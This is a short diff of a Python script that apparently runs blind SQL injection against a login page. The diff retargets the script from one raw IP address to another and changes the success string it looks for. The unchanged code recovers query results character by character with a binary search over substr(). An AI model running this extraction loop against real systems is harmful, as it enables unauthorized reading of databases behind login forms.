@@ -1,7 +1,7 @@
 from __future__ import print_function
 import requests, sys
-BASE_URL = "http://95.85.49.66:5002/login"
-SUCCESS_TEXT = "YEEEEY"
+BASE_URL = "http://46.101.24.55/login"
+SUCCESS_TEXT = "are in"
 URL_PARAMS = {'user': None,
               'pass': None}
 
@@ -41,6 +41,7 @@ def execquery(query):
     for i in range(1,qlen):
         printProgressBar(i, total, prefix = 'Progress:', suffix = 'Complete', length = 50)
         fulltext+=chr(binsearch("substr(({}),{},1)".format(query,i),0,127,lambda x: "'"+chr(x)+"'" if chr(x)!="'" else '"\'"'))
+        # print(fulltext)
     print("Result:")
     print(fulltext)
 
